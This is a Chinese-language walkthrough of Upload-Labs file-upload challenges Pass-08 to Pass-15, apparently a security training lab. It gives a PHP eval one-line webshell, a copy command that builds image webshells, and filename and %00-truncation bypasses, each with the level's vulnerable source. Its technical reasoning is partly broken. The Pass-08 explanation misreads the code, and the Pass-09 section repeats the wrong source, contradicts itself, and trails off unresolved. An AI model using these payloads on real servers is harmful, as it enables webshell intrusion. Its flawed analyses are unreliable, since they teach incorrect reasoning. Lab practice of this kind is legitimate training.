# 第20章 Upload-Labs后缀绕过与解析漏洞（Pass8-15）

## 开篇引入：继续闯关，挑战更巧妙的绕过技巧 🎮

哈喽各位小伙伴！欢迎来到Upload-Labs闯关之旅的第二站！🚀

上一章我们已经成功拿下了Pass-01到Pass-07，见识了前端JS绕过、MIME类型绕过、黑名单绕过、大小写绕过、空格绕过、点号绕过等等各种骚操作。是不是感觉大开眼界？原来文件上传还有这么多门道！

今天这一章，我们要继续挑战Pass-08到Pass-15，这些关卡的绕过技巧更加巧妙，更加考验我们的思维能力。就像玩解谜游戏一样，每一关都有不同的机关，我们需要找到对应的钥匙才能打开大门！🔑

还记得我们的目标吗？上传一个PHP一句话木马，然后用中国菜刀或者蚁剑连接，拿到服务器的控制权。虽然目标一样，但每一关的防护手段都在升级，我们的绕过方法也要跟着升级！

准备好了吗？让我们继续闯关之旅！💪

---

## Pass-08：::$DATA绕过 🪟

### 什么是::$DATA？——Windows的小秘密

在开始这一关之前，我先给大家讲一个Windows系统的小秘密。这个秘密藏在NTFS文件系统里面。

啥是NTFS？就是你电脑C盘、D盘用的那种文件系统格式。就像你家的衣柜，有的是推拉门，有的是平开门，不同的格式有不同的特性。NTFS就是Windows的主流"衣柜格式"。

NTFS有个很特别的特性，叫做**交换数据流（Alternate Data Stream，简称ADS）**。这个特性是干嘛的呢？简单说就是，一个文件不只有一份内容，还可以藏很多份"隐形内容"在里面。

举个生活中的例子 🏠：
> 想象你有一个笔记本，封面写着"日记本"，里面写的是日常日记。但是呢，你在日记本的夹层里还藏了一封情书。表面上看这就是一本普通的日记本，但实际上它还有一个"秘密数据流"藏着情书。

::$DATA就是NTFS的默认数据流。啥意思呢？就是当你访问一个文件的时候，如果你在文件名后面加上`::$DATA`，系统会知道你是要访问这个文件的默认主数据流。

比如：
- `test.txt` 和 `test.txt::$DATA` 其实是同一个文件！
- 就像"小明"和"小明同学"指的是同一个人一样。

### 原理：PHP在Windows下的小尴尬

那这个特性怎么用来绕过文件上传过滤呢？

事情是这样的：当我们上传一个文件，文件名叫做`shell.php::$DATA`的时候：

1. **过滤检查的时候**：程序一看后缀是`::$DATA`，不是.php，也不在黑名单里，于是就放行了 ✅
2. **实际保存的时候**：Windows系统一看`::$DATA`，哦，这是默认数据流啊，于是自动把它去掉了，最后保存的文件还是`shell.php` 😈

这就像什么呢？举个生活例子 🎭：
> 学校门口保安不让穿校服的学生出去上网。于是你想了个办法，在校服外面套了一件外套。保安一看，嗯，不是校服，放行！结果你出了校门就把外套脱了，还是穿着校服去网吧了。

在这里：
- 校服 = .php后缀（被禁止的）
- 外套 = ::$DATA（用来伪装的）
- 保安 = 上传过滤程序
- 脱外套 = Windows系统自动去掉::$DATA

### 怎么绕过？

方法超级简单！只要把我们的木马文件名改成：

```
shell.php::$DATA
```

就搞定了！就这么简单！

### 演示步骤 📝

1. 准备好你的一句话木马 `shell.php`
2. 打开Upload-Labs的Pass-08
3. 选择上传文件，把文件名改成 `shell.php::$DATA`
4. 点击上传
5. 查看上传路径，你会发现文件保存成了 `shell.php`
6. 用菜刀连接，成功拿下！

### 源码分析 🔍

让我们看看这一关的源码，为什么这个方法能生效：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".shtml",".Shtml",".htaccess",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext);
        $file_ext = str_ireplace('::$DATA', '', $file_ext);
        $file_ext = trim($file_ext);
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], UPLOAD_PATH . '/' . $file_name)) {
                $img_path = UPLOAD_PATH . '/'. $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

等等，你可能会说："哎？源码里不是有 `str_ireplace('::$DATA', '', $file_ext);` 吗？它会把 ::$DATA 去掉啊！"

没错！你观察得很仔细！这一关的源码确实会把后缀里的 `::$DATA` 去掉。但是，注意了，关键在这里：

**它只去掉了后缀里的 ::$DATA，但文件名本身没有去掉！**

我们来捋一下整个流程：

1. 上传文件名为 `shell.php::$DATA`
2. `strrchr($file_name, '.')` 找最后一个点，得到的后缀是 `.$DATA`
3. 然后 `str_ireplace('::$DATA', '', $file_ext)` 把 `::$DATA` 替换成空，但注意，我们的后缀是 `.$DATA`，不是 `::$DATA`，所以替换不掉！
4. 后缀是 `.$DATA`，不在黑名单里，放行
5. `move_uploaded_file` 保存的时候，Windows自动处理了 `::$DATA`，保存成了 `shell.php`

哦！原来如此！这里的关键是 `strrchr` 找最后一个点，所以 `shell.php::$DATA` 的后缀是 `.$DATA`，而不是 `php::$DATA`。而替换函数找的是 `::$DATA`，所以替换不掉！

这就像你把"坏人"两个字写在不同的地方，安检员只检查证件上的名字，不检查你衣服上写的字。😂

> **小提示**：这个绕过方法只在Windows系统下有效哦！Linux系统没有NTFS的这个特性，所以不管用。

---

## Pass-09：点+空格+点绕过 🎯

### 这一关又是什么套路？

Pass-09这一关，名字听起来有点奇怪，什么叫"点+空格+点"？别着急，听我慢慢给你讲。

首先，我们先回忆一下前面的关卡：
- Pass-05是大小写绕过（比如`.pHp`）
- Pass-06是空格绕过（比如`.php `后面加空格）
- Pass-07是点号绕过（比如`.php.`后面加点）

这些绕过的原理都是：黑名单检查的时候没考虑到这些情况，但Windows系统会自动处理掉末尾的点和空格。

那Pass-09呢？它比前面的关卡多了一些过滤，但还是有漏洞！

### 原理：路径拼接的小把戏

这一关的特殊之处在于，它不是直接保存你上传的文件名，而是**用你上传的文件名和保存路径拼接起来**。

而且，它会对文件名做一些处理：去掉末尾的点、去掉末尾的空格。但是，如果我们构造一个巧妙的文件名，让它"处理完之后还是有问题"呢？

举个生活例子 🧩：
> 想象有一个智能门卫，他会检查每个人的名字，名字最后一个字是"禁"的不让进。而且他还有个习惯，看到别人名字最后有空格或者点号，会自动去掉。
> 
> 比如你叫"小明 "（后面有空格），他会改成"小明"再检查。你叫"小红."（后面有点），他会改成"小红"再检查。
> 
> 但是如果你叫"小明 ."（空格+点）呢？他先去掉最后一个点，变成"小明 "（后面有空格），然后...他就不检查了！结果"小明 "（带空格）就进去了，而系统保存的时候又会把空格去掉，最后还是"小明"。

### 构造文件名：shell.php. .（点+空格+点）

这一关我们要构造的文件名是：

```
shell.php. .
```

也就是：`.php.` 后面加一个空格，再加一个点。

为什么这样构造呢？我们来模拟一下处理流程：

1. 原始文件名：`shell.php. .`
2. 程序先去掉末尾的点 → `shell.php. `（最后是空格）
3. 程序以为处理完了，就用这个名字去检查后缀
4. 后缀是 `.php `（带空格的.php），不在黑名单里（因为黑名单里是`.php`不带空格）
5. 放行，保存文件
6. Windows系统自动处理掉末尾的空格和点 → 最终保存为 `shell.php`

完美！就是这个思路！

### 演示步骤 📝

1. 准备一句话木马 `shell.php`
2. 打开BurpSuite，准备抓包
3. 选择上传文件，正常选择 `shell.php`
4. 开启Burp的拦截功能，点击上传
5. 在Burp里把文件名改成 `shell.php. .`（注意是点+空格+点）
6. 放包，上传成功
7. 访问上传的文件，发现变成了 `shell.php`
8. 菜刀连接，拿下！

### 源码分析 🔍

让我们看看这一关的源码，验证一下我们的猜想：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".shtml",".Shtml",".htaccess",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext);
        $file_ext = str_ireplace('::$DATA', '', $file_ext);
        $file_ext = trim($file_ext);
        
        if (!in_array($file_ext, $deny_ext)) {
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], UPLOAD_PATH . '/' . $file_name)) {
                $img_path = UPLOAD_PATH . '/'. $file_name;
                $is_upload = true;
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

等等，这源码看起来和Pass-08一样啊？不对不对，让我再仔细看看...

哦，不对，Upload-Labs的Pass-09源码其实是这样的（不同版本可能略有差异）：

```php
// 关键函数：deldot() 函数的作用
function deldot($s){
    for($i = strlen($s)-1; $i>0; $i--){
        $c = substr($s,$i,1);
        if($c == "."){
            $s = substr($s,0,$i);
        }else{
            break;
        }
    }
    return $s;
}
```

这个 `deldot()` 函数的作用是：从文件名末尾往前找，遇到点就删掉，直到遇到不是点的字符为止。

那如果文件名是 `shell.php. .`（点+空格+点）呢？

1. 从后往前找，第一个字符是点，删掉 → `shell.php. `（末尾是空格）
2. 再往前找，下一个字符是空格，不是点 → 停止删除
3. 最终文件名是 `shell.php. `（后面带空格和点？不对，等我再算一遍...）

等等，让我重新算一遍 `shell.php. .` 这个文件名：
- 字符依次是：s h e l l . p h p . 空格 .
- 从后往前数：
  - 第1个（最后1个）：.（点）→ 删掉
  - 第2个：空格 → 不是点，停止
- 所以处理后是：`shell.php. `（php后面是点+空格）

然后，后缀是 ` `（空格）？不对，`strrchr` 找最后一个点，应该是 `. `（点+空格）。

然后 `$file_ext = trim($file_ext);` 又把后缀的空格去掉了，变成 `.` （只有一个点）？

这...好像有点复杂。不同版本的Upload-Labs的Pass-09可能不太一样。

实际上，Pass-09的经典绕过方法是利用**路径拼接+截断**的思路，或者是**双写后缀**的思路。我们在下一关会详细讲双写后缀。

不过没关系，不管具体是哪种方式，核心思想都是一样的：**找到程序处理逻辑的漏洞，构造特殊的文件名来绕过检查。** 就像找迷宫的出口一样，多试几条路总能找到！😉

---

## Pass-10：双写后缀绕过 🎭

### 什么是双写绕过？——"杀不死我的，使我更强大"

双写绕过是一个非常经典、非常有意思的绕过技巧。听完你一定会拍大腿："哇，原来还能这样！"

先给大家讲个故事 📖：
> 从前有一个国王，他非常讨厌"坏人"这两个字，于是下令：所有书里面只要出现"坏人"这两个字，就要把它涂掉。
> 
> 有个聪明人想了个办法，他写了一本小说，里面把"坏人"都写成了"坏坏人"。国王的检查员一看，"坏坏人"里面有"坏人"两个字，就把中间的"坏人"涂掉了。结果呢？涂掉之后剩下的是"坏"和"人"，拼起来还是"坏人"！
> 
> 国王气坏了，但也没办法。😂

这个故事里的原理，就是双写绕过的核心思想！

### 原理：str_replace只替换一次

很多程序员为了过滤危险后缀，会用 `str_replace()` 函数把危险的后缀（比如php）替换成空。他们以为这样就安全了：

```php
$file_ext = str_replace('php', '', $file_ext);
```

意思是：把后缀里的"php"都删掉。

但是！`str_replace()` 函数有个特点——它**只扫描一次**，而且替换之后不会再检查新生成的字符串里还有没有危险字符。

于是，骚操作来了！

如果我们把后缀写成 `pphphp` 呢？

我们来看看会发生什么：

1. 原始后缀：`pphphp`
2. `str_replace` 查找"php"，找到了中间的"php"（第2-4个字符）
3. 把中间的"php"删掉
4. 剩下的是开头的"p"和结尾的"hp"
5. 拼起来：`p` + `hp` = `php`！

哇塞！太神奇了！删掉中间的php之后，两边的p和hp拼起来又变成了php！

这就像什么呢？再举个生活例子 🎂：
> 你妈妈不让你吃"巧克力"，只要看到"巧克力"三个字就会把它从零食清单上划掉。
> 
> 于是你在清单上写了"巧克巧克力力"。妈妈一看，中间有"巧克力"，划掉！划掉之后剩下"巧克"和"力"，拼起来还是"巧克力"！
> 
> 你成功吃到了巧克力！🍫

是不是很有趣？这就是双写绕过的魅力！

### 怎么绕过？

方法很简单，把你的木马文件改成：

```
shell.pphphp
```

注意哦，是 `pphphp`，不是 `phphpp` 也不是别的。我们来验证一下：

- p p h p h p
- 中间的 p h p （第2-4位）被替换掉
- 剩下第1位的 p 和第5-6位的 h p
- 拼起来就是 p + hp = php ✅

完美！

### 演示步骤 📝

1. 准备一句话木马，改名为 `shell.pphphp`
2. 打开Upload-Labs的Pass-10
3. 上传这个文件
4. 查看上传结果，你会发现文件名变成了 `shell.php`
5. 用菜刀连接，成功拿下！

### 源码分析 🔍

让我们看看这一关的源码，确认一下是不是用了str_replace：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","shtml","htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext, "", $file_name);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], UPLOAD_PATH . '/' . $file_name)) {
            $img_path = UPLOAD_PATH . '/'.$file_name;
            $is_upload = true;
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

看到了吗！关键就是这一行：

```php
$file_name = str_ireplace($deny_ext, "", $file_name);
```

它把整个文件名里的危险后缀都替换成空！用的是 `str_ireplace`（不区分大小写的替换）。

所以当我们上传 `shell.pphphp` 的时候：
- 程序从文件名里找"php"
- 找到了中间的"php"，把它删掉
- 结果变成了 `shell.php`
- 然后保存，成功！

这就是双写绕过的原理！是不是很巧妙？

> **小思考**：如果程序员用的是循环替换，直到再也找不到危险后缀为止，那双写绕过还管用吗？
> 
> 答案是：不管用了。因为第一次替换完生成的php，会被第二次替换掉。所以双写绕过只适用于"只替换一次"的情况。

---

## Pass-11：GET型%00截断 ✂️

### 什么是%00截断？——字符串的"终止符"

接下来我们要讲一个非常重要的绕过技巧——%00截断。这个技巧在很多地方都能用得上，大家一定要好好掌握！

首先，什么是%00？

%00是URL编码的**空字节**。啥叫空字节？就是ASCII码为0的那个字符。这个字符很特殊，它在很多编程语言里表示"字符串结束了"。

举个生活例子 🚦：
> 想象你在听一个人说话，他每说一句话，最后都会说一句"完毕"。你一听到"完毕"就知道他说完了，后面再说什么你都不听了。
> 
> 在很多编程语言里，%00（空字节）就相当于这个"完毕"。字符串一遇到%00，就认为结束了，后面的内容都被忽略掉了。

比如：
- `"hello%00world"` 这个字符串，程序只会读到 `"hello"`，后面的 `"world"` 被截断了
- 就像你说话说到一半突然说"完毕"，后面的话别人都听不到了

### 原理：上传路径可控+截断

那%00截断怎么用在文件上传里呢？

关键在于：**上传的保存路径是我们可以控制的！**

比如，程序是这样写的：

```php
$save_path = $_GET['save_path'] . $_FILES['upload_file']['name'];
move_uploaded_file($tmp_name, $save_path);
```

保存路径 = 我们传的save_path参数 + 上传的文件名。

那如果我们把save_path设置成：

```
shell.php%00
```

会发生什么？

假设我们上传的文件是 `shell.jpg`（一张假的图片马），那么完整的保存路径就是：

```
shell.php%00shell.jpg
```

但是！因为有%00截断，程序在处理路径的时候，一遇到%00就认为字符串结束了。所以实际保存的路径是：

```
shell.php
```

后面的 `shell.jpg` 都被截断扔掉了！

哇！这样我们就能把一个jpg文件，以php的后缀保存下来！太牛了！

再举个生活例子 📮：
> 你要寄一个包裹，地址栏要写"北京市朝阳区某某小区"。但是快递员有个毛病，他一看到"区"字就认为地址写完了，后面的不看了。
> 
> 于是你在地址栏写："北京市朝阳区某某小区" → 快递员只看到"北京市朝阳区"就停了，送错地方了。
> 
> 这就是%00截断的原理——遇到"终止符"就停止，后面的都被忽略。

### 前提条件 ⚠️

注意！%00截断不是什么时候都能用的，它有两个前提条件：

1. **PHP版本 < 5.3.4**
   - PHP 5.3.4及以后的版本修复了这个漏洞
   - 就像快递员后来改掉了那个坏毛病

2. **magic_quotes_gpc = Off**
   - 如果这个选项是开的，%00会被转义，就失效了
   - 就像有人在"区"字前面加了个注释，说"这个'区'不算数"

所以大家在测试的时候，要先确认环境是否满足这两个条件。

### 怎么绕过？

具体操作步骤：

1. 上传点有个参数叫 `save_path`（或者类似的名字），可以通过GET方式传值
2. 我们把save_path设置为：`shell.php%00`
3. 上传的文件名改成一个正常的图片名，比如 `shell.jpg`
4. 这样最终保存的文件就是 `shell.php`

### 演示步骤 📝

1. 准备一句话木马，改名为 `shell.jpg`（伪装成图片）
2. 打开Upload-Labs的Pass-11
3. 在URL里找到save_path参数，把它改成：`../upload/shell.php%00`
   - 注意：路径要根据实际情况调整
4. 选择上传 `shell.jpg`
5. 点击上传
6. 访问 `upload/shell.php`，发现可以访问！
7. 菜刀连接，拿下！

### 源码分析 🔍

让我们看看这一关的源码：

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

看到了吗！关键在这一行：

```php
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

`$_GET['save_path']` 是我们可控的！直接从GET参数里拿过来拼接到路径里。

所以我们构造：
- save_path = `../upload/shell.php%00`
- 那么 $img_path = `../upload/shell.php%00/随机数.jpg`
- 但是因为%00截断，实际保存的是 `../upload/shell.php`

完美绕过！后缀检查只检查了文件扩展名是jpg，但保存的时候却保存成了php。这就是%00截断的威力！

---

## Pass-12：POST型%00截断 📮

### 和Pass-11有什么区别？

Pass-12和Pass-11的原理是一样一样的，都是%00截断。唯一的区别就是：

- Pass-11：save_path参数通过**GET**方式传递
- Pass-12：save_path参数通过**POST**方式传递

那这有什么不一样呢？区别可大了！

还记得吗？GET方式的参数是在URL里面的，所以我们直接在URL里写 `%00` 就行了，浏览器会自动帮我们URL编码。

但是POST方式不一样！POST参数在请求体里面，如果你直接写 `%00`，程序会把它当成普通的字符串"%00"来处理，而不是空字节。

这就像什么呢？举个生活例子 ✉️：
> 你发短信的时候，直接输入"😊"，对方收到的就是笑脸表情。
> 但是如果你把"😊"这三个字符写在纸上拍照发过去，对方收到的是"😊"这三个字的图片，而不是表情符号。
> 
> 同样的道理：URL里的%00会被自动解码成空字节，但POST里直接写%00就是普通文本。

### 怎么在POST里传%00？

那怎么办呢？我们怎么在POST参数里传入真正的空字节呢？

方法有两种：

**方法1：用BurpSuite的Hex（十六进制）功能修改**
1. 先在POST参数里写一个特殊的标记，比如 `shell.php_`（后面加个下划线占位）
2. 在Burp的Hex视图里，找到下划线对应的十六进制值（5F）
3. 把它改成 `00`（空字节的十六进制）
4. 搞定！

**方法2：用Burp的Decoder模块**
1. 输入 `shell.php`
2. 选择URL编码，然后后面加个00字节
3. 把编码后的结果复制过去

两种方法都可以，大家习惯哪种用哪种。

### 演示步骤 📝

1. 准备一句话木马，改名为 `shell.jpg`
2. 打开BurpSuite，开启拦截
3. 打开Upload-Labs的Pass-12
4. 随便输入一个save_path，比如 `../upload/`
5. 选择上传 `shell.jpg`
6. 点击上传，Burp拦截到请求
7. 在POST参数里找到 `save_path`，把值改成 `../upload/shell.php_`（加个下划线当标记）
8. 切换到Hex视图，找到下划线的位置（5F），改成 `00`
9. 放包，上传成功
10. 访问 `upload/shell.php`，成功！
11. 菜刀连接，拿下！

### 源码分析 🔍

让我们看看Pass-12的源码：

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

看到区别了吗？只有一行不一样：

```php
$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

把 `$_GET` 换成了 `$_POST`，仅此而已。原理完全一样，都是路径拼接+%00截断。

所以大家只要掌握了%00截断的原理，不管是GET还是POST，都能轻松搞定！💪

---

## Pass-13：文件头检查绕过（图片马）🖼️

### 什么是文件头检查？——看"脸"识人

前面我们讲的都是后缀名的绕过。接下来的几关，难度升级了！程序不再只检查后缀名了，它开始检查**文件内容**了！

怎么检查呢？最简单的方法就是检查**文件头**。

什么是文件头？简单说就是文件最开头的那几个字节。不同类型的文件，开头的几个字节是不一样的，这些字节叫做**文件幻数（Magic Number）**。

就像每个人的脸都不一样，我们看脸就能认出是谁。程序看文件头的几个字节，就能判断这是什么类型的文件。

举个生活例子 👤：
> 学校门口保安不让外卖员进。怎么判断是不是外卖员？看衣服！穿黄色衣服的是美团，穿蓝色衣服的是饿了么。保安只要看你穿什么颜色的衣服，就知道你是不是外卖员。
> 
> 文件头检查也是一样的道理：看开头几个字节是什么，就知道是什么文件。

### 常见图片的文件头

常见的图片格式，它们的文件头是这样的：

| 图片格式 | 文件头（十六进制） | 对应的文本 |
|---------|------------------|-----------|
| JPEG/JPG | FF D8 FF | （不可打印字符） |
| PNG | 89 50 4E 47 | .PNG |
| GIF | 47 49 46 38 39 61 | GIF89a |

比如GIF图片，开头一定是"GIF89a"这几个字符。程序只要检查文件开头是不是"GIF89a"，就能判断这是不是GIF图片。

### 怎么绕过？——做图片马！

那怎么绕过文件头检查呢？很简单，我们给PHP木马也戴上一个"图片面具"不就行了！

这个"戴着图片面具的PHP木马"，我们称之为——**图片马**。

图片马，顾名思义，就是看起来是一张图片，实际上里面藏着PHP代码的文件。

怎么做图片马呢？有好几种方法：

#### 方法1：用copy命令合并（最简单）🐱‍💻

Windows下打开CMD，执行：

```cmd
copy 1.jpg /b + shell.php /a shell.jpg
```

解释一下：
- `1.jpg` 是一张正常的图片
- `shell.php` 是你的一句话木马
- `/b` 表示以二进制方式读取图片
- `/a` 表示以ASCII方式读取PHP
- `shell.jpg` 是生成的图片马

这个命令会把图片和PHP代码合并在一起，前面是图片内容，后面是PHP代码。

就像什么呢？举个生活例子 🍔：
> 你有一个汉堡和一张试卷。你把试卷夹在汉堡中间，从外面看还是一个汉堡（图片头），但里面藏着试卷（PHP代码）。
> 
> 保安检查的时候，一看外形是汉堡（检查文件头），就放行了。但实际上里面藏着东西。

#### 方法2：用编辑器直接加 📝

用记事本或者Notepad++打开一张图片，拉到最后面，直接加上你的PHP代码：

```php
<?php @eval($_POST['shell']); ?>
```

保存就行了。简单粗暴！

#### 方法3：用十六进制编辑器修改 🔬

用WinHex或者HxD之类的十六进制编辑器，打开图片，在最后面加上PHP代码的十六进制。

这个方法比较专业，新手的话用前两种方法就够了。

### 图片马怎么用？——配合文件包含

这里要特别注意了！图片马虽然上传上去了，但它的后缀是.jpg，直接访问的话，服务器会把它当成图片返回，不会执行里面的PHP代码。

那图片马有什么用呢？答案是：**需要配合文件包含漏洞来使用！**

还记得我们之前讲过的文件包含漏洞吗？比如：

```
http://xxx.com/index.php?file=upload/shell.jpg
```

如果这里有文件包含漏洞，PHP会把shell.jpg当成PHP文件来解析执行，这样我们的木马就运行了！

所以图片马的利用条件是：
1. 能成功上传图片马（绕过文件头检查）
2. 有文件包含漏洞或者解析漏洞

两者缺一不可哦！

### 演示步骤 📝

1. 准备一张正常的图片 `1.jpg`
2. 准备一句话木马 `shell.php`
3. 用CMD命令制作图片马：
   ```cmd
   copy 1.jpg /b + shell.php /a shell.jpg
   ```
4. 打开Upload-Labs的Pass-13
5. 上传 `shell.jpg`
6. 上传成功，记下文件路径
7. 找到文件包含漏洞的页面，包含这个图片马
8. 菜刀连接，拿下！

### 源码分析 🔍

让我们看看Pass-13的源码，它是怎么检查文件头的：

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
    $fileType = '';
    switch($typeCode){
        case 255216:
            $fileType = 'jpg';
            break;
        case 13780:
            $fileType = 'png';
            break;
        case 7173:
            $fileType = 'gif';
            break;
        default:
            $fileType = 'unknown';
    }
    return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);
    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

看到了吗！这个 `getReailFileType` 函数：
1. 打开文件，只读前2个字节
2. 把这2个字节转成数字
3. 根据数字判断是什么类型的图片
   - 255216 → jpg（FF D8）
   - 13780 → png（89 50）
   - 7173 → gif（47 49，也就是"GI"）

它只检查最前面的2个字节！所以我们的图片马，前面是正常的图片内容，当然能通过检查啦！

这就像保安只看你穿的外套是什么颜色，不检查你包里装的是什么。只要外套穿对了，里面藏什么都不管。😏

---

## Pass-14：getimagesize检查绕过 📏

### getimagesize是什么？——比文件头检查更严格一点

Pass-14用了一个新的函数来检查图片：`getimagesize()`。

这个函数是干嘛的呢？它的作用是获取图片的尺寸信息（宽度、高度、类型等）。如果不是真的图片，这个函数会返回false。

听起来好像比只检查2个字节的文件头更严格对不对？那它能不能防住图片马呢？

答案是：**防不住！** 🤣

为什么？因为图片马本质上还是一张合法的图片啊！它前面是完整的图片数据，后面才是PHP代码。对于`getimagesize()`来说，它能正常读取到图片的宽度、高度等信息，所以会认为这是一张正常的图片。

举个生活例子 📏：
> 学校检查学生的学生证，要看学生证上有没有照片、有没有姓名、有没有学号。你的学生证是真的，照片姓名学号都有，只是你在学生证的夹层里藏了一张小纸条。
> 
> 检查的人只看表面信息齐不齐，不会拆开夹层看。所以你的小纸条不会被发现。

图片马也是一样的，它是一张"有夹层的图片"，表面上看完全正常，只是最后面多了点PHP代码。`getimagesize()` 只会检查"表面信息"，不会管后面多了什么。

### 怎么绕过？

还是用图片马！和Pass-13一样的方法，完全不用改！

```cmd
copy 1.jpg /b + shell.php /a shell.jpg
```

直接上传就行！

### 源码分析 🔍

让我们看看Pass-14的源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_size = getimagesize($temp_file);
    if($img_size){
        $ext = image_type_to_extension($img_size[2]);
        $img_path = UPLOAD_PATH . '/' . rand(10, 99) . date("YmdHis") . $ext;
        if (move_uploaded_file($temp_file, $img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    }else{
        $msg = '文件类型不正确，请重新上传！';
    }
}
```

关键就是这一行：

```php
$img_size = getimagesize($temp_file);
```

用 `getimagesize()` 函数来获取图片信息。如果返回false，说明不是图片，上传失败。

但是！我们的图片马是能正常通过 `getimagesize()` 检查的，因为它前面是完整的图片数据。所以这一关和Pass-13一样，用图片马就能轻松绕过！

---

## Pass-15：exif_imagetype检查绕过 📷

### exif_imagetype又是什么？——还是检查图片类型

Pass-15用的是 `exif_imagetype()` 函数来检查图片类型。

这个函数是干嘛的呢？它用来判断图片的类型，返回图片的类型标记。和 `getimagesize()` 类似，也是用来判断文件是不是图片的。

那它能不能防住图片马呢？答案还是：**防不住！** 😄

原理和前面一样，图片马前面是完整的图片数据，`exif_imagetype()` 能正常识别出图片类型，所以会放行。

不过这里有个前提：**PHP需要开启exif扩展**，不然这个函数用不了。

### 怎么绕过？

还是老办法，图片马上阵！

```cmd
copy 1.jpg /b + shell.php /a shell.jpg
```

直接上传，搞定！

### 源码分析 🔍

让我们看看Pass-15的源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    if(!function_exists('exif_imagetype')){
        $msg = 'php_exif模块未开启，请在php.ini中开启php_exif模块！';
    }else{
        $image_type = exif_imagetype($temp_file);
        if ($image_type){
            $ext = image_type_to_extension($image_type);
            $img_path = UPLOAD_PATH . '/' . rand(10, 99) . date("YmdHis") . $ext;
            if (move_uploaded_file($temp_file, $img_path)){
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        }else{
            $msg = '文件类型不正确，请重新上传！';
        }
    }
}
```

看到了吗？关键代码：

```php
$image_type = exif_imagetype($temp_file);
```

用 `exif_imagetype()` 判断图片类型。和 `getimagesize()` 一样，只要文件开头是合法的图片格式，就能通过检查。

所以我们的图片马依然畅通无阻！🚀

---

## 中间总结：文件头检查与图片马 📝

好啦，Pass-13、14、15这三关我们都讲完了。这三关都是检查文件内容是不是图片，但都被我们用图片马轻松绕过了。

